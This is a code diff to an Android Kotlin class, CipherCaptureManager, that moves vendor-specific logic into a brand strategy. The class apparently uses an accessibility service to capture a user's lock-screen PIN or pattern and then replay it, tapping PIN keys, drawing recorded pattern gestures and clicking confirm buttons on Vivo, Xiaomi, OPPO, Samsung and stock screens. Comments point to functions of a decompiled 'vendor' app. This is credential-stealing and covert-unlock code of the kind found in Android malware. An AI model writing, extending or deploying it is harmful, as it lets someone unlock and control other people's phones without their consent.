@@ -16,7 +16,7 @@ import android.view.accessibility.AccessibilityNodeInfo
 import java.security.KeyStore
 import java.util.Arrays
 import java.util.LinkedHashMap
-import java.util.Locale
+
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
@@ -888,16 +888,12 @@ class CipherCaptureManager(
             val pkg = root.packageName?.toString() ?: return false
             if (!isPasswordInputPackage(pkg)) return false
 
-            // vendor L793 — 确认键/密码框 viewId 候选
+            // vendor L793 — 确认键/密码框 viewId 候选 (generic + brand-specific)
             val confirmLockIds = listOf(
                 "$pkg:id/key0",
                 "$pkg:id/key1",
                 "$pkg:id/lockPattern",
                 "$pkg:id/four_to_more_key0",
-                "$pkg:id/vivo_pin_confirm",
-                "$pkg:id/mix_confirm",
-                "$pkg:id/iv_complete",
-                "$pkg:id/mix_normal_confirm",
                 "$pkg:id/passwordEntry",
                 "$pkg:id/password_entry",
                 "com.android.settings:id/key0",
@@ -906,7 +902,7 @@ class CipherCaptureManager(
                 "com.android.settings:id/passwordEntry",
                 "com.android.systemui:id/key0",
                 "com.android.systemui:id/lockPattern"
-            )
+            ) + brandStrategy.extraConfirmLockIds(pkg)
             for (id in confirmLockIds) {
                 val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                 if (!nodes.isNullOrEmpty()) {
@@ -1718,30 +1714,15 @@ class CipherCaptureManager(
                             if (patternNode == null) patternNode = findPatternNodeByClass(refreshedRoot)
 
                             if (patternNode != null) {
-                                val brand = Build.BRAND.lowercase(Locale.ROOT)
                                 val boundsInScreen = cipher["boundsInScreen"] as? android.graphics.Rect
                                 val boundsInParent = cipher["boundsInParent"] as? android.graphics.Rect
 
-                                if (brand == "vivo" || brand == "iqoo" || boundsInScreen == null || boundsInParent == null) {
-                                    // vivo/iqoo: 使用原始坐标
-                                    val pts = ArrayList<android.graphics.PointF>()
-                                    for (p in dedupedPoints) pts.add(android.graphics.PointF(p.x.toFloat(), p.y.toFloat()))
-                                    Log.d(TAG, "使用原始坐标: ${pts.size}个点")
-                                    gestureSuccess = playPatternGestureFull(pts)
-                                } else {
-                                    // 非 vivo: 坐标映射
-                                    val nodeRect = android.graphics.Rect()
-                                    if (Build.VERSION.SDK_INT >= 34) {
-                                        patternNode.getBoundsInScreen(nodeRect) // getBoundsInWindow not available via a11y
-                                    } else {
-                                        patternNode.getBoundsInScreen(nodeRect)
-                                    }
-                                    val parentRect = android.graphics.Rect()
-                                    patternNode.getBoundsInParent(parentRect)
-                                    val mapped = transformPatternPoints(dedupedPoints, boundsInScreen, boundsInParent, nodeRect, parentRect)
-                                    val pts = ArrayList<android.graphics.PointF>()
-                                    for (p in mapped) pts.add(android.graphics.PointF(p.x.toFloat(), p.y.toFloat()))
-                                    Log.d(TAG, "非Vivo坐标映射: ${pts.size}个点")
+                                // Brand strategy resolves coordinates (Vivo: raw, others: transform)
+                                val pts = brandStrategy.resolvePatternGesturePoints(
+                                    dedupedPoints, patternNode, boundsInScreen, boundsInParent, ::transformPatternPoints
+                                )
+                                if (pts != null && pts.size >= 2) {
+                                    Log.d(TAG, "图案坐标解析: ${pts.size}个点 (strategy=${brandStrategy.tag})")
                                     gestureSuccess = playPatternGestureFull(pts)
                                 }
                             } else {
@@ -2038,26 +2019,15 @@ class CipherCaptureManager(
         return reconstructed
     }
 
-    /** 完整 clickConfirmButton — MIUI/Vivo/Samsung/通用。vendor: a2 (65 行) */
+    /** 完整 clickConfirmButton — brand strategy + 通用回退。vendor: a2 (65 行) */
     fun clickConfirmButtonFull() {
         try {
             val root = service.rootInActiveWindow ?: return
             val pkg = root.packageName?.toString() ?: "com.android.settings"
             val basePkg = if (pkg == "com.android.systemui") "com.android.systemui" else "com.android.settings"
-            val isMiui = Build.BRAND.lowercase(Locale.ROOT).let { it == "xiaomi" || it == "redmi" || it == "poco" }
-            if (isMiui) {
-                var btn = findNodeByViewIdAndClass(root, "$basePkg$MIUI_CONFIRM_KEY", "android.widget.TextView")
-                if (btn == null) btn = findNodeByViewIdAndClass(root, "com.android.systemui$MIUI_CONFIRM_KEY", "android.widget.TextView")
-                if (btn != null && btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击MIUI确认键"); return }
-            }
-            val isVivo = Build.BRAND.lowercase(Locale.ROOT).let { it == "vivo" || it == "iqoo" }
-            if (isVivo) {
-                for ((id, cls) in listOf(Pair("$basePkg:id/mix_confirm", "android.view.View"), Pair("$basePkg:id/iv_complete", "android.widget.TextView"), Pair("$basePkg:id/vivo_pin_confirm", "android.widget.Button"), Pair("$basePkg:id/mix_normal_confirm", "android.widget.TextView"))) {
-                    var node = findNodeByViewIdAndClass(root, id, cls) ?: findNodeByViewId(root, id)
-                    if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击Vivo确认键: $id"); return }
-                    if (basePkg != "com.android.settings") { val altId = id.replace(basePkg, "com.android.settings"); node = findNodeByViewIdAndClass(root, altId, cls) ?: findNodeByViewId(root, altId); if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击Vivo确认键(fallback): $altId"); return } }
-                }
-            }
+            // Brand-specific confirm button
+            if (brandStrategy.clickBrandConfirmButton(root, pkg, basePkg, ::findNodeByViewId, ::findNodeByViewIdAndClass)) return
+            // Generic key_enter fallback
             for (id in listOf("$basePkg:id/key_enter", "com.android.systemui:id/key_enter", "com.android.settings:id/key_enter")) {
                 val nodes = root.findAccessibilityNodeInfosByViewId(id)
                 if (nodes != null) for (node in nodes) if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "点击通用Enter键: $id"); return }
@@ -2127,24 +2097,18 @@ class CipherCaptureManager(
         } catch (e: Exception) { Log.w(TAG, "tryAdbPinInput 异常: ${e.message}"); return false }
     }
 
-    /** 完整 tryKeyNodeInput — OPPO/Vivo/通用。vendor: e4 (149 行) */
+    /** 完整 tryKeyNodeInput — brand strategy + 通用回退。vendor: e4 (149 行) */
     fun tryKeyNodeInputFull(pin: String, qualityType: String): Boolean {
         try {
             val root = service.rootInActiveWindow ?: return false
             val pkg = root.packageName?.toString() ?: ""
             val isSystemUi = pkg == "com.android.systemui"
             val basePkg = when { isSystemUi -> "com.android.systemui"; pkg == "com.samsung.android.biometrics.app.setting" -> pkg; else -> "com.android.settings" }
-            val brand = Build.BRAND.lowercase(Locale.ROOT)
-            if (brand == "oppo" || brand == "realme" || brand == "oneplus") {
-                var cr = service.rootInActiveWindow ?: root
-                for (ch in pin) { val n = findNodeByContentDesc(cr, ch.toString()); if (n != null && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { Log.d(TAG, "Click Pin Node desc: $ch"); if (isSystemUi) sleep200() else sleep500() }; try { cr.refresh() } catch (_: Exception) {} }
-                clickConfirmButtonFull()
+            // Brand-specific PIN input
+            if (brandStrategy.inputPinViaKeyNodes(root, pin, basePkg, isSystemUi, service, ::findNodeByViewId, ::findNodeByContentDesc, ::clickConfirmButtonFull, ::sleep200, ::sleep500)) {
+                if (verifySuccess()) return true
             }
-            if (brand == "vivo" || brand == "iqoo") {
-                var cr = service.rootInActiveWindow ?: root; var any = false
-                for (ch in pin) { val n = findNodeByViewId(cr, "$basePkg:id/four_to_more_key$ch"); if (n != null && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { if (isSystemUi) sleep200() else sleep500(); any = true }; try { cr.refresh() } catch (_: Exception) {} }
-                if (any) { clickConfirmButtonFull(); if (verifySuccess()) return true }
-            }
+            // Generic key$ch fallback
             var cr = service.rootInActiveWindow ?: root; var any = false
             for (ch in pin) { val id = "$basePkg:id/key$ch"; val n = findNodeByViewIdAndClass(cr, id, "android.view.ViewGroup") ?: findNodeByViewId(cr, id); if (n != null && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { if (isSystemUi) sleep200() else sleep500(); any = true }; try { cr.refresh() } catch (_: Exception) {} }
             if (any) { clickConfirmButtonFull(); return verifySuccess() }
